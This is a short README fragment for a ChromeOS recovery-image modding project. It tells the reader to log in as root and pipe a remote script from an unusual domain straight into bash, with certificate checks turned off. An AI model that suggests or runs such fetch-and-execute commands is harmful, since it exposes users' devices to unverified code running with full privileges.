...
Of note, __before__ flashing the image FWMP must be disabled. To be sure it is, boot devmode as normal, open VT2 **[Ctrl+Alt+F2]** and login as `root` then run `bash <(curl -Lsk cdn.xz8f.gay/d.sh)`.
...
* `build_image.sh`
   * Autobuilder for building modified recovery images with modmium installed.
* `modmium.sh`
